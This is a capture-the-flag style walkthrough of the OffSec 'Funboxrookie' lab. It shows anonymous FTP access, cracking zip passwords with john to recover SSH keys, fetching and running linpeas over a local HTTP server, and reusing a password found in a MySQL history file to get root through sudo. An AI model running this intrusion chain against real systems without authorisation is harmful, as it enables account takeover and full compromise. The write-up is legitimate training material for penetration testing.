
# OffSec labs - Funboxrookie

Initial nmap scan showed a few open and interesting ports: 
```shell
nmap -sV -sC -n -O -T4 -p- -Oa scan 192.168.89.107/24

```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)
|   256 15004667809b40123a0c6607db1d1847 (ECDSA)
|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 3.4 (91%), Linux 3.5 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Synology DiskStation Manager 5.1 (91%), WatchGuard Fireware 11.8 (91%), Linux 2.6.35 (90%), Linux 3.10 (90%)
```

We see nmap identified port 21 on FTP as anonymous login enabled, it also gives us a list of files on the server.
lets login 
```shell
ftp anonymous@192.168.89.107
```
lets see if we can upload something 
```shell
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||41295|)
550 test.txt: Operation not permitted
```
Nope, no luck, lets download the file on here and snoop around in them

```shell
                                                                               
┌──(kali㉿kali)-[~/Documents/funboxrookie/ftp]
└─$ unzip anna.zip    
Archive:  anna.zip
[anna.zip] id_rsa password:
```
We need a password to unzip them! 
Lets move on to the webserver and see what we can do on port 80
Looks like an apache page, lets try to find some directories

```shell
gobuster dir -u http://192.168.89.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
No luck on finding directories, lets try to crack one of the zip files passwords with john 

```shell
zip2john cathrine.zip > cat.john
```
Now lets try to crack it! 
```shell
john cat.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press `q` or Ctrl-C to abort, almost any other key for status
catwoman         (cathrine.zip/id_rsa)     
1g 0:00:00:00 DONE (2022-11-14 19:29) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
we got a password!

lets unzip the file

```shell
unzip cathrine.zip 
Archive:  cathrine.zip
[cathrine.zip] id_rsa password: 
  inflating: id_rsa
```
Looks like an rsa key was in the zip file, hopefully we can use it to ssh into the server, lets try.

```shell
ssh cathrine@192.168.89.107 -i id_rsa
Connection closed by 192.168.89.107 port 22
```
It didn't work! We forgot to change the file permissions...

```shell
sudo chmod 600 id_rsa
```
Lets try again

```shell
ssh cathrine@192.168.89.107 -i id_rsa
Connection closed by 192.168.89.107 port 22
```
still not working....
i'm gonna crack another zip and try that rsa key. 

After cracking, unzipping, and changing perms for tom.zip we can finally connect.

```shell
ssh tom@192.168.89.107 -i id_rsa     
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 15 00:50:35 UTC 2022

  System load:  0.0               Processes:             164
  Usage of /:   74.7% of 4.37GB   Users logged in:       0
  Memory usage: 36%               IP address for ens256: 192.168.89.107
  Swap usage:   0%


30 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ 
ls
cat local.txt 
```

got the user flag! 

now lets try to privesc, running linpeas.sh

on my box:
```shell
python3 -m `http.server`
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
in ssh session:
```shell
wget http://<ip>:8000/peas.sh
```
```shell
bash peas.sh
```
linpeas didn`t turn up anything usefull, lets check out history files

trying to cd anywhere gives an error, lets upgrade to a full tty python

```shell
python3 -c `import os; os.system("/bin/bash");`
```
Now lets check some history files, bash first
```shell
cat .bash_history
```
blank! 

this sql one looks interesting 

```shell
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040`support`;
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit

```
Looks like a possible password in the last query? lets try it 

```shell
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL

```
ALL COMMANDS! 
```shell
sudo su
root@funbox2:/home/tom# whoami
root
```
WE GOT ROOT

```shell
cd /root/
cat proof.txt
```

Overall easy box covering: anonymous FTP login, password cracking, and lack of history cleaning.  



